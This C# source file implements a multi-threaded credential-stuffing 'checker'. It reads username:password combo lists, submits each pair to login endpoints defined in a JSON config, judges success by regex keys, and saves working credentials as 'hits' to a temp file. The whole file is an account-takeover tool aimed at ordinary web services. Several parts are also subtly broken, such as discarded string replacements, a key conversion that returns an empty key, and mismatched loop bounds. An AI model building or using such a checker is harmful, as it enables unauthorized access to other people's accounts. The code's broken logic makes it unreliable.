using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Media.Animation;
using Newtonsoft.Json;
using xNet;
using JuicyLib.StringMechanic;

namespace JuicyLib.Network
{
    public class Checker
    {
        private readonly Worker[] _workers;
        private readonly Thread[] _threads;
        private readonly HttpRequest[] _requests;
        private readonly Config _config;

        private RequestParams _parameters;

        private readonly string _comboLocation;
        private readonly int comboCount;

        private static int iCombo; // Current ComboIndex

        private readonly string tempPath;
        public readonly string TempFileName = "JuicyLib_Hits_Temp.txt";

        public Checker(string comboLocation, string configLoc)
        {
            this._comboLocation = comboLocation;
            tempPath = Path.GetTempPath();

            // Get the config information
            using StreamReader reader = new StreamReader(configLoc);
            _config = Newtonsoft.Json.JsonConvert.DeserializeObject<Config>(reader.ReadToEnd());

            comboCount = Files.LineCount(comboLocation);
            int threads = (_config.General.MaxThreads > comboCount) ? comboCount : _config.General.MaxThreads;

            _workers = new Worker[threads];
            _threads = new Thread[threads];
            _requests = new HttpRequest[threads];

            for (int iWorker = 0; iWorker < _config.General.MaxThreads; iWorker++)
            {
                _workers[iWorker] = new Worker();
                _workers[iWorker].Tasks += Check;

                _requests[iWorker] = new HttpRequest();
            }
        }

        public void Abort()
        {
            for (int iThread = 0; iThread < Files.LineCount(_comboLocation); iThread++)
            {
                _threads[iThread].Abort();
            }
        }

        public void Start()
        {
            using StreamReader reader = new StreamReader(_comboLocation);
            for (int iThread = 0; iThread < Files.LineCount(_comboLocation); iThread++)
            {
                _threads[iThread] = new Thread(new ThreadStart(_workers[iThread].Start));
                _threads[iThread].Start();
            }
        }

        async void Check(Worker w)
        {
            List<Key> keys = new List<Key>();
            string[] x;
            Account acc = null;
            string post = null;

            for (int iRequest = 0; iRequest < _config.Requests.Count; iRequest++)
            {
                #region Post Setup
                post = _config.Requests[iRequest].PostData;
                try
                {
                    x = File.ReadAllLines(_comboLocation);
                    acc = $"{x[iCombo].Split(':')[0]}:{x[iCombo].Split(':')[1]}";
                    iCombo++;

                    post.Replace("{uName}", acc.UserName);
                    post.Replace("{Pass}", acc.Password);

                    if (iRequest > 0)
                    {
                        int i = 1;
                        foreach (Key key in keys)
                        {
                            post.Replace($"{{{key.Name}}}", key.Value);
                            i++;
                        }
                    }
                }
                catch (Exception) { }

                if (_config.Requests[iRequest].PostData.Length > 1)
                    ProcessPost(post);
                #endregion

                if (_config.Requests[iRequest].UserAgent != null &&
                    _config.Requests[iRequest].Url != null &&
                    _parameters.Count != 0)
                {

                    try
                    {
                        _requests[iRequest].UserAgent = _config.Requests[iRequest].UserAgent;
                        string source = _requests[iRequest].Post(_config.Requests[iRequest].Url, _parameters).ToString();

                        if (iRequest < _config.Requests.Count - 1)
                        {
                            #region Get Parameter
                            for (int iSuc = 0; iSuc < _config.Requests[iRequest].SuccesKeys.Count; iSuc++)
                            {
                                Regex succes = new Regex(_config.Requests[iRequest].SuccesKeys[iSuc].Value);
                                MatchCollection matches = succes.Matches(source);
                                for (int iMatch = 0; iMatch < matches.Count; iMatch++)
                                {
                                    keys.Add(new Key(_config.Requests[iRequest].SuccesKeys[iSuc].Value,
                                        iMatch.ToString()));
                                }
                            }

                            for (int iFa = 0; iFa < _config.Requests[iRequest].SuccesKeys.Count; iFa++)
                            {
                                Regex fail = new Regex(_config.Requests[iRequest].FailureKeys[iFa].Value);
                                MatchCollection matches = fail.Matches(source);

                                if (matches.Count > 0)
                                    return;
                            }
                            #endregion
                        }
                        else
                        {
                            #region ComboCheck
                            for (int iFa = 0; iFa < _config.Requests[iRequest].SuccesKeys.Count; iFa++)
                            {
                                Regex fail = new Regex(_config.Requests[iRequest].FailureKeys[iFa].Value);
                                MatchCollection matches = fail.Matches(source);

                                if (matches.Count > 0)
                                {
                                    w.Fail();
                                    return;
                                }
                            }

                            for (int iSuc = 0; iSuc < _config.Requests[iRequest].SuccesKeys.Count; iSuc++)
                            {
                                Regex succes = new Regex(_config.Requests[iRequest].SuccesKeys[iSuc].Value);
                                MatchCollection matches = succes.Matches(source);

                                if (matches.Count > 0)
                                {
                                    using StreamWriter sw = new StreamWriter(Path.Combine(tempPath, "JuicyLib_Hits_Temp.txt"));
                                    await sw.WriteLineAsync($"{acc.UserName}:{acc.Password}");
                                    w.Complete();
                                    break;
                                }
                            }
                            #endregion
                        }
                    }
                    catch (HttpException ex)
                    {
                        MessageBox.Show(ex.HttpStatusCode.ToString(), "error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
        }

        void ProcessPost(string post)
        {
            string[] postParams = post.Split(',');

            foreach (string p in postParams)
            {
                // Split the parameter to key and value replace the "
                _parameters[p.Split(':')[0].Replace("\"", "")] = p.Split(':')[1].Replace("\"", "");
            }
        }
    }

    public class Worker
    {
        public event Action<Worker> Tasks;
        public event Action OnCompletion;
        public event Action OnFailure;

        public async void Start()
        {
            Tasks?.Invoke(this);
            OnCompletion?.Invoke();
        }

        public void Complete()
        {
            OnCompletion?.Invoke();
        }

        public void Fail()
        {
            OnFailure?.Invoke();
        }
    }

    public class AsyncChecker
    {

    }

    public struct Key
    {
        public Key(string name, string value)
        {
            Name = name;
            Value = value;
        }

        public Key(string key)
        {
            if (key.Contains(','))
            {
                Name = key.Split(',')[0];
                Value = key.Split(',')[1];
            }
            else
            {
                Name = "New Key";
                Value = key;
            }
        }

        public string Name { get; }
        public string Value { get; }

        public static implicit operator Key(string key)
        {
            return new Key();
        }

        public static implicit operator string(Key key)
        {
            return key.ToString();
        }

        public override string ToString() => $"{Name}, {Value}";
    }

    public struct Account
    {
        public Account(string userName, string password)
        {
            UserName = userName;
            Password = password;
        }

        public Account(string nameNPass)
        {
            UserName = nameNPass.Split(':')[0];
            Password = nameNPass.Split(':')[1];
        }

        public static implicit operator Account(string account)
        {
            return new Account(account);
        }

        public static implicit operator string(Account account)
        {
            return account.ToString();
        }

        public string UserName { get; }
        public string Password { get; }

        public override string ToString() => $"{UserName}:{Password}";
    }
}
